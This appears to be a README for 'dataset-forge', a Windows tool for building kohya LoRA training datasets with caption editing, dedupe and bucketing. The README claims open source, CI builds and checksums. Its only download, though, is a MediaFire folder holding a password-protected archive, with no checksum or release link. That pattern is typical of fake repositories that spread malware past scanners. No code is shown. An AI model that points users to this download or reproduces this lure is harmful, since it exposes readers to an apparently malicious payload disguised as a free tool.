# dataset-forge

🏗️ Free, open-source dataset builder for Windows — kohya folder layout, bulk captions, dedupe and bucketing. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Kohya layout in one click** — folder-per-concept tree with the 1_concept repeat naming trainers expect
- ✅ **Bulk caption editor** — edit thousands of .txt captions in a fast grid with find and replace
- ✅ **Hash dedupe** — near-duplicate images found by perceptual hash before your training wastes epochs on them
- ✅ **Bucketing preview** — see which resolution buckets your images will land in before the trainer runs
- ✅ **Trigger word injector** — prepend or fix a trigger token across every caption consistently
- ✅ **Export as zip** — a trainer-ready archive with a printed tree summary of the run
- ✅ **100 MB self-contained exe** — runtime bundled, portable, fully offline, MIT with SHA-256 releases

## Why dataset-forge

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **dataset-forge** | kohya_ss GUI | Manual folders | Colab notebooks |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free | Free tier |
| Open source | **Yes** | Yes | N/A | Partial |
| Caption grid editor | **Yes** | Partial | Notepad | No |
| Perceptual dedupe | **Yes** | No | No | Scripted
| Bucketing preview | **Yes** | Partial | No | No
| Portable, no install | **Yes, 100 MB** | Python env | N/A | Browser

## FAQ

**how to prepare an image dataset for LoRA training on Windows?**

Training guides jump straight to the trainer, but most failed runs trace back to folder layout, duplicate images and inconsistent captions. dataset-forge builds the kohya tree, dedupes by perceptual hash and fixes captions in bulk before anything trains. It is a 100 MB portable exe, MIT, offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark forge (#121417, amber #F59E0B): folder tree left with 1_style and 10_character nodes, image grid center with caption bars, dedupe report chip reading 14 near-duplicates found.
2. Caption grid: thirty rows of thumbnail, caption text and edit state, find and replace bar with trigger word field, apply-to-selected button.
3. Bucketing preview: resolution bucket cards with image counts and crop notes, export zip button, tree summary panel listing 1,842 files sorted.

## Download

| Source | Link |
|---|---|
| 💾 **Installer dataset-forge** | [Installer dataset-forge](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).